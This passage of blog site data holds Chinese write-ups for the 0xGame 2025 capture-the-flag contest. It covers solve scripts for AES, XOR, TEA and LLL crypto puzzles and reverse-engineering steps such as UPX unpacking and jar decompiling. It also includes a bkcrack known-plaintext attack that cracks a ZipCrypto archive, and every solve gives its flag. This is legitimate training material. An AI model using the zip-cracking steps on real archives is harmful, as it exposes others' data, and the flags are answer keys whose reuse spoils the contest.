class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. PEGA AQUÍ EL TEXTO CIFRADO COMPLETO DE 160 CARACTERES.</span></span><br><span class=\"line\"><span class=\"comment\">#    El que proporcionaste tiene 156 caracteres (78 bytes), le faltan 4 caracteres (2 bytes) al final.</span></span><br><span class=\"line\"><span class=\"comment\">#    Asegúrate de copiarlo entero.</span></span><br><span class=\"line\">hex_ciphertext = <span class=\"string\">&quot;83c9b4db1e036eada862d24928ae12641f7e56f713598661600da434cf3bc3e74429cbb807173626516dd030d964ad1f06ef2f9da03722943ba57653c4e0733b8474d57d450b01a331b1bd7ea36dcc4b&quot;</span> <span class=\"comment\"># &lt;--- ¡REEMPLAZA ESTO CON EL VALOR COMPLETO!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. La clave fija del programa.</span></span><br><span class=\"line\">key = <span class=\"string\">b&#x27;0xGame2025awaQAQ&#x27;</span></span><br><span class=\"line\">block_size = AES.block_size  <span class=\"comment\"># 16 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- Script de Desencriptación Correcto ---</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    full_ciphertext = <span class=\"built_in\">bytes</span>.fromhex(hex_ciphertext)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Comprobación de la longitud</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(full_ciphertext) % block_size != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] ADVERTENCIA: La longitud del texto cifrado (<span class=\"subst\">&#123;<span class=\"built_in\">len</span>(full_ciphertext)&#125;</span> bytes) no es un múltiplo de 16.&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[!] Esto indica que el texto cifrado está incompleto. El resultado será incorrecto.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(full_ciphertext) &lt; block_size:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;El texto cifrado es demasiado corto.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># El primer bloque del texto cifrado (C_1) actúa como el IV para descifrar el resto del mensaje.</span></span><br><span class=\"line\">    iv_for_decryption = full_ciphertext[<span class=\"number\">0</span>:block_size]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># El texto cifrado que queremos descifrar es todo lo que sigue al primer bloque (C_2, C_3, ...).</span></span><br><span class=\"line\">    ciphertext_to_decrypt = full_ciphertext[block_size:]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Crear un nuevo cifrador CFB usando C_1 como IV.</span></span><br><span class=\"line\">    cipher = AES.new(key, AES.MODE_CFB, iv=iv_for_decryption)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Descifrar para obtener (padded_flag + urandom_final).</span></span><br><span class=\"line\">    decrypted_payload = cipher.decrypt(ciphertext_to_decrypt)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Contenido descifrado: <span class=\"subst\">&#123;decrypted_payload&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># El mensaje original era: padded_flag(48 bytes) + urandom(16 bytes).</span></span><br><span class=\"line\">    <span class=\"comment\"># Por lo tanto, el contenido descifrado debería tener 64 bytes.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(decrypted_payload) &lt; <span class=\"number\">48</span>: <span class=\"comment\"># Necesitamos al menos los 48 bytes de la flag.</span></span><br><span class=\"line\">         <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;El contenido descifrado es demasiado corto para contener la flag.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Aislamos los bloques que deberían contener la flag con padding (los primeros 48 bytes del payload).</span></span><br><span class=\"line\">    padded_flag = decrypted_payload[:<span class=\"number\">48</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Intentar quitar el padding de la parte de la flag.</span></span><br><span class=\"line\">    flag = unpad(padded_flag, block_size)</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag_str = flag.decode()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag_str.startswith(<span class=\"string\">&quot;0xGame&#123;&quot;</span>) <span class=\"keyword\">and</span> flag_str.endswith(<span class=\"string\">&quot;&#125;&quot;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] ¡ÉXITO! La flag es: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[!] Se descifró un texto, pero no parece tener el formato de la flag.&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] Texto obtenido: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> (ValueError, IndexError) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[!] ERROR: No se pudo descifrar la flag. Causa probable: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[!] Por favor, comprueba que has copiado el texto cifrado completo (160 caracteres hexadecimales).&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[!] Ocurrió un error inesperado: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;5adccb16-92b6-4d44-89dd-c1e39f6c9338&#125;</code></p>\n<h1 id=\"Osint\"><a href=\"#Osint\" class=\"headerlink\" title=\"Osint\"></a>Osint</h1><h2 id=\"机场\"><a href=\"#机场\" class=\"headerlink\" title=\"机场\"></a>机场</h2><p>根据橙黄色廊桥和西藏航空的飞机(Tibet Airlines)可以确定是<code>珠海金湾机场</code>，三字码是ZUH，注意这个是大写，然后用网站上的加密工具进行32位小写md5加密，得到<code>296d0dd1964288715beb8e2d06dca1a5</code>,就得到flag了。</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"baby-python逆向\"><a href=\"#baby-python逆向\" class=\"headerlink\" title=\"baby_python逆向\"></a>baby_python逆向</h2><ul>\n<li><p>使用<code>pyinstxtractor</code>提取文件，运行<code>python pyinstxtractor.py babyPy.exe</code>，从.exe中提取.pyc文件(注意这个工具要和目标程序放在同一个目录下。)</p>\n</li>\n<li><p>使用<code>uncompyle6</code>反编译，<code>uncompyle6 babyPy.pyc &gt; decompiled_code.py</code>,然后就可以在<code>decompiled_code.py</code>这个脚本里找到flag了。</p>\n</li>\n<li><p><code>0xGame&#123;c2a6d59d-34dc-4b94-96aa-e823bdcb4823&#125;</code></p>\n</li>\n</ul>\n<h2 id=\"baby-java逆向\"><a href=\"#baby-java逆向\" class=\"headerlink\" title=\"baby_java逆向\"></a>baby_java逆向</h2><ul>\n<li><p><code>jar -tf BabyJar.jar</code>分析文件结构</p>\n</li>\n<li><pre><code class=\"language-python\"># 提取所有 class 文件\njar -xf BabyJar.jar\n\n# 使用 javap 查看字节码（基础信息）\njavap -c com/BabyJar/demo/BabyJar.class\njavap -c com/BabyJar/demo/Encrypt.class\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">​\t查看类的基础信息。</span><br><span class=\"line\"></span><br><span class=\"line\">- 找到密文`QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=`   和   加密过程`原始flag → 每个字节 XOR 20 → 交换高低4位 → Base64编码 → 比较`</span><br><span class=\"line\"></span><br><span class=\"line\">- 解密：`Base64解码 → 交换高低4位 → 每个字节 XOR 20 → 得到原始flag`</span><br><span class=\"line\"></span><br><span class=\"line\">- 完整exp：</span><br><span class=\"line\"></span><br><span class=\"line\">  ```python</span><br><span class=\"line\">  import base64</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 硬编码的密文</span><br><span class=\"line\">  encoded = &quot;QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=&quot;</span><br><span class=\"line\">  </span><br><span class=\"line\">  # Base64 解码</span><br><span class=\"line\">  encrypted_bytes = base64.b64decode(encoded)</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 逆向加密过程</span><br><span class=\"line\">  def decrypt(data):</span><br><span class=\"line\">      result = []</span><br><span class=\"line\">      for byte in data:</span><br><span class=\"line\">          # 1. 先交换高低4位（逆向第一步）</span><br><span class=\"line\">          swapped = ((byte &amp; 0x0F) &lt;&lt; 4) | ((byte &amp; 0xF0) &gt;&gt; 4)</span><br><span class=\"line\">          # 2. 再与 key=20 进行 XOR（逆向第二步）</span><br><span class=\"line\">          decrypted = swapped ^ 20</span><br><span class=\"line\">          result.append(decrypted)</span><br><span class=\"line\">      return bytes(result)</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 解密</span><br><span class=\"line\">  decrypted = decrypt(encrypted_bytes)</span><br><span class=\"line\">  flag = decrypted.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">  print(f&quot;Flag: &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure>\n\n得到flag：`0xGame&#123;73e214d2-d85c-4441-bc17-8e10c0e7b8c2&#125;`.\n</code></pre>\n</li>\n</ul>\n<h2 id=\"16位程序与asm汇编\"><a href=\"#16位程序与asm汇编\" class=\"headerlink\" title=\"16位程序与asm汇编\"></a>16位程序与asm汇编</h2><p>数据分两个循环两种加密。每23个字节为一段。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 完整加密数据</span></span><br><span class=\"line\">encrypted = [</span><br><span class=\"line\">    <span class=\"number\">0x47</span>, <span class=\"number\">0x7F</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x47</span>, <span class=\"number\">0x47</span>,</span><br><span class=\"line\">    <span class=\"number\">0x73</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0x85</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0x6F</span>,</span><br><span class=\"line\">    <span class=\"number\">0x46</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x6C</span>,  <span class=\"comment\"># 前23字节</span></span><br><span class=\"line\">    <span class=\"number\">0x33</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x73</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x37</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x33</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x61</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x65</span>,</span><br><span class=\"line\">    <span class=\"number\">0x32</span>, <span class=\"number\">0x33</span>, <span class=\"number\">0x88</span>   <span class=\"comment\"># 后23字节</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 分开两部分</span></span><br><span class=\"line\">part1 = encrypted[:<span class=\"number\">23</span>]  <span class=\"comment\"># 循环1处理</span></span><br><span class=\"line\">part2 = encrypted[<span class=\"number\">23</span>:]  <span class=\"comment\"># 循环2处理</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法1：先sub 9再xor 0E (循环1)</span></span><br><span class=\"line\">decrypted1 = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> byte <span class=\"keyword\">in</span> part1:</span><br><span class=\"line\">    decrypted1 += <span class=\"built_in\">chr</span>(((byte - <span class=\"number\">9</span>) &amp; <span class=\"number\">0xFF</span>) ^ <span class=\"number\">0x0E</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法2：先xor 0E再sub 9 (循环2)  </span></span><br><span class=\"line\">decrypted2 = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> byte <span class=\"keyword\">in</span> part2:</span><br><span class=\"line\">    decrypted2 += <span class=\"built_in\">chr</span>(((byte ^ <span class=\"number\">0x0E</span>) - <span class=\"number\">9</span>) &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;第一部分:&quot;</span>, decrypted1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;第二部分:&quot;</span>, decrypted2)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;完整Flag:&quot;</span>, decrypted1 + decrypted2)</span><br></pre></td></tr></table></figure>\n\n<p>逆向解密，得到：<code>0xGame&#123;g00d_u_4r3_th3_m45t3r_0f_45m_E2f7a1b34&#125;</code></p>\n<p>很好，你是汇编大师🥰🥰。</p>\n<h2 id=\"shuffle\"><a href=\"#shuffle\" class=\"headerlink\" title=\"shuffle\"></a>shuffle</h2><p>IDA里可以看到打乱的flag：<code>23-64bed6&#125;-xm5300-&#123;faGa34-0e04c2e7c2a78f39a4</code>,随机数种子1638，MSVC的标准C语言库生成的随机数，和打乱逻辑:</p>\n<p><img src=\"/images/wp/shuffle.png\" alt=\"shuffle\"></p>\n<p>编写逆向脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> idx <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(operations) - <span class=\"number\">1</span>, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">       i, swap_idx = operations[idx]</span><br><span class=\"line\">       arr[i], arr[swap_idx] = arr[swap_idx], arr[i]</span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(arr)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;5ffa9030-e204-4673-b4c6-ed433aca7228&#125;</code></p>\n<h2 id=\"TELF\"><a href=\"#TELF\" class=\"headerlink\" title=\"TELF\"></a>TELF</h2><p>010的使用:在光标处键入数据会<strong>自动往后覆盖</strong>，实现替换。(或者选中某块数据然后开始键入，修改替换掉该块的数据。)注意不要删除，删了之后再键入就是继续往后覆盖数据了。这就不能实现该数据块的替换了，反而替换掉了后面不该替换的数据。<strong>删除不要乱点！</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> ctypes</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ctypes.CDLL(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 srand 和 rand 函数的原型</span></span><br><span class=\"line\">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class=\"line\">libc.srand.restype = <span class=\"literal\">None</span></span><br><span class=\"line\">libc.rand.argtypes = []</span><br><span class=\"line\">libc.rand.restype = ctypes.c_int</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_keys</span>():</span><br><span class=\"line\">    seed = <span class=\"number\">0xF6950</span></span><br><span class=\"line\">    libc.srand(seed)</span><br><span class=\"line\">    keys = [(libc.rand()) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> keys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">v, k</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    使用 TEA 算法解密一个 64 位的数据块。</span></span><br><span class=\"line\"><span class=\"string\">    v: 一个包含两个 32 位无符号整数的元组 (v0, v1)。</span></span><br><span class=\"line\"><span class=\"string\">    k: 一个包含四个 32 位整数的密钥数组。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    v0, v1 = v</span><br><span class=\"line\">    delta = <span class=\"number\">0x9e3779b9</span></span><br><span class=\"line\">    num_rounds = <span class=\"number\">32</span></span><br><span class=\"line\">    sum_val = (delta * num_rounds) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_rounds):</span><br><span class=\"line\">        term1 = ((v0 &lt;&lt; <span class=\"number\">4</span>) + k[<span class=\"number\">2</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term2 = (v0 + sum_val) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term3 = ((v0 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">3</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        v1 = (v1 - (term1 ^ term2 ^ term3)) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term1 = ((v1 &lt;&lt; <span class=\"number\">4</span>) + k[<span class=\"number\">0</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term2 = (v1 + sum_val) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term3 = ((v1 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">1</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        v0 = (v0 - (term1 ^ term2 ^ term3)) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        sum_val = (sum_val - delta) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> v0, v1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    enc = <span class=\"built_in\">bytes</span>([</span><br><span class=\"line\">        <span class=\"number\">0xAD</span>, <span class=\"number\">0xDA</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0xDC</span>, <span class=\"number\">0xAE</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x08</span>,</span><br><span class=\"line\">        <span class=\"number\">0x4E</span>, <span class=\"number\">0xF5</span>, <span class=\"number\">0x4F</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0x6E</span>, <span class=\"number\">0x5F</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0x9E</span>,</span><br><span class=\"line\">        <span class=\"number\">0x0A</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0xA9</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xC2</span>,</span><br><span class=\"line\">        <span class=\"number\">0x4B</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0x3D</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0xD6</span>, <span class=\"number\">0x28</span>,</span><br><span class=\"line\">        <span class=\"number\">0xF6</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0xB4</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x3B</span>,</span><br><span class=\"line\">        <span class=\"number\">0xFB</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xEF</span>, <span class=\"number\">0xD6</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0xB2</span>,</span><br><span class=\"line\">        <span class=\"number\">0xEB</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0x1B</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0x1F</span>, <span class=\"number\">0x53</span></span><br><span class=\"line\">    ])</span><br><span class=\"line\">    keys = get_keys()</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypted_flag = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(enc), <span class=\"number\">8</span>):</span><br><span class=\"line\">        chunk = enc[i:i+<span class=\"number\">8</span>]</span><br><span class=\"line\">        v = struct.unpack(<span class=\"string\">&#x27;&lt;2I&#x27;</span>, chunk)</span><br><span class=\"line\">        decrypted_v = decrypt(v, keys)</span><br><span class=\"line\">        decrypted_chunk = struct.pack(<span class=\"string\">&#x27;&lt;2I&#x27;</span>, decrypted_v[<span class=\"number\">0</span>], decrypted_v[<span class=\"number\">1</span>])</span><br><span class=\"line\">        decrypted_flag += decrypted_chunk</span><br><span class=\"line\">        flag_str = decrypted_flag.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>).rstrip(<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;&#123;&#123;flag_str&#125;&#125;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>首先是upx脱壳，但是upx标签被修改成了X1c，用010替换X1c为UPX然后就能脱壳了，脱完之后就能逆向了,得到:</p>\n<p><code>0xGame&#123;PANDORA-PANRADOXXX-101AP-9CDE02B83F5D6-7B1A9C348&#125;</code>  flag .</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"明文攻击\"><a href=\"#明文攻击\" class=\"headerlink\" title=\"明文攻击\"></a>明文攻击</h2><ul>\n<li><p>先构造一个png文件，，bkcrack只需要12个字节的明文就能爆破，<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code>，文件头是这个。</p>\n</li>\n<li><p>运行<code>bkcrack.exe -C attachment.zip -c huiliyi.png -p 01.png</code>，爆破得到<code>cdc564be 5675041f 719adb56</code>密钥。</p>\n</li>\n<li><p>最后<code>bkcrack.exe -C attachment.zip -c flag.txt -k cdc564be 5675041f 719adb56 -d flag_decrypted.txt</code>得到flag</p>\n</li>\n<li><p><code>0xGame&#123;Y0u_cRacked_M3!z1p_1s_uNsafe!&#125;</code></p>\n</li>\n</ul>\n"},{"title":"0xGame Week3 WP","date":"2025-11-06T16:00:00.000Z","top_img":null,"cover":null,"_content":"\n\n\n# Crypto\n\n## Ez_LLL\n\n```python\nfrom Crypto.Util.number import long_to_bytes\n\np = 151240196317566398919874094060690044886978001146739221635377812709640347441550250665168046149125216617951660209690860015625296899030453965800801283336223544189902980591153121592938172963303968803995733283426759581586368403208379337416298836517168491618212440911971420911495272791409112867645195821357346746831\nh = 124332746104765845147133491132959579184849644379099440465281812273660434050281263409975356196112560300248343107170084466976976410232928660489912629913525776979726428263975968343564076005019264661696777686114079504603568726429498116488469855127100166072195548037981863885014261706582936943023968781022607949646\n\n# Build lattice\nM = matrix(ZZ, [\n    [1, h],\n    [0, p]\n])\n\n# LLL reduction\nL = M.LLL()\n\nfor row in L:\n    f_candidate = abs(row[0])\n    g_candidate = abs(row[1])\n    # Check if g_candidate is 350-bit prime\n    if g_candidate.nbits() == 350 and is_prime(g_candidate):\n        flag = long_to_bytes(f_candidate)\n        if b'0xGame' in 